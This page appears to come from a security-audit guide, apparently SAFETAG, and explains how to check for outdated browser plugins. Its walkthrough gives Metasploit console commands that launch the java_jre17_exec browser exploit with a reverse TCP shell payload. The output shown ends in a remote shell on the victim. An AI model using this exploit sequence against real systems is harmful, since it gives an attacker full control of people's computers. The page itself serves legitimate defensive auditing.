<h1 id="check-browser-and-plugin-vulnerabilities">Check Browser and Plugin Vulnerabilities</h1>
<h2 id="summary">Summary</h2>
<p>Though modern browsers are better at self-updating, and the prevalence of powerful plugins like flash and java are slowly declining, it is valuable to ensure that the browsers in use have updated plugins and are themselves updated.</p>
<h2 id="materials-needed">Materials Needed</h2>
<ul>
<li>Metasploit</li>
</ul>
<h2 id="walkthrough">Walkthrough</h2>
<h6 id="outdated-java-browser-plugins">Outdated Java browser plugins</h6>
<p>While the threat described below is more severe if carried out by a local attacker (as they can more readily direct the victim to a malicious Web site), it also works remotely. In fact, if a user can be tricked, by a remote attacker, into clicking on a malicious email or Web link, attacks like this represent a significant perimeter threat. By compromising the victim’s machine, they can give the attacker a local point-of-presence without requiring the attacker to crack WPA keys or gain local access in some other way.</p>
<p>Step 1: Using Metasploit, an attacker can easily create an ad hoc malicious Web site:</p>
<pre><code>$ msfconsole

IIIIII    dTb.dTb        _.---._
  II     4&#39;  v  &#39;B   .&#39;&quot;&quot;.&#39;/|\`.&quot;&quot;&#39;.
  II     6.     .P  :  .&#39; / | \ `.  :
  II     &#39;T;. .;P&#39;  &#39;.&#39;  /  |  \  `.&#39;
  II      &#39;T; ;P&#39;    `. /   |   \ .&#39;
IIIIII     &#39;YvP&#39;       `-.__|__.-&#39;

I love shells --egypt


       =[ metasploit v4.7.0-dev [core:4.7 api:1.0]
+ -- --=[ 1114 exploits - 627 auxiliary - 178 post
+ -- --=[ 307 payloads - 30 encoders - 8 nops

msf &gt; use exploit/multi/browser/java_jre17_exec

msf exploit(java_jre17_exec) &gt; set PAYLOAD java/shell/reverse_tcp
PAYLOAD =&gt; java/shell/reverse_tcp

msf exploit(java_jre17_exec) &gt; set LHOST 192.168.1.123
LHOST =&gt; 192.168.1.123

msf exploit(java_jre17_exec) &gt; set SRVPORT 8081
SRVPORT =&gt; 8081

msf exploit(java_jre17_exec) &gt; set URIPATH java_test
URIPATH =&gt; java_test

msf exploit(java_jre17_exec) &gt; run
[*] Exploit running as background job.</code></pre>
<p>Step 2: At this point, any local user who visits <a href="http://192.168.1.123:8081/java_test" class="uri">http://192.168.1.123:8081/java_test</a>, and who is running a sufficiently out-of-date version of the Java browser plugin, stands a good chance of giving the attacker full access to his computer:</p>
<pre><code>[*] Started reverse handler on 192.168.1.123:4444

msf exploit(java_jre17_exec) &gt;

[*] Using URL: http://0.0.0.0:8081/java_test
[*] Local IP: http://192.168.1.123:8081/java_test
[*] Server started.

msf exploit(java_jre17_exec) &gt;

&lt;remote shell&gt;</code></pre>
<p>Figure 1: Attacker in control of the victim’s computer through a remote command shell</p>
<!-- Following snippet transcluded from references/footnotes.md with resolveMetalsmith.url(../references/footnotes.md) {"id":"references/footnotes.md","name":null,"origin":"https://github.com/SAFETAG/SAFETAG","origin_path":"master/en/references/footnotes.md"} -->
<!-- Notes -->
<!-- Penetration/Security/Risk Testing Standards / Guides -->
<!-- Threat Modeling -->
<!-- Facilitation -->
<!-- Censorship Measurement -->
<!-- ONI -->
<!-- Country Infrastructure info -->
<!-- Media / Speech Freedom Threats -->
<!-- Human Rights and Governance-->
<!-- Surveillance and Censorship -->
<!-- Security Risks -->
<!-- Malware and Threat reports -->
<!-- Security Advisories -->
<!-- Technical Training & Guides -->
<!-- Tech adoption and usability -->
<!-- Sections -->
<!-- Appendices -->
<!-- End of transcluded snippet from references/footnotes.md -->
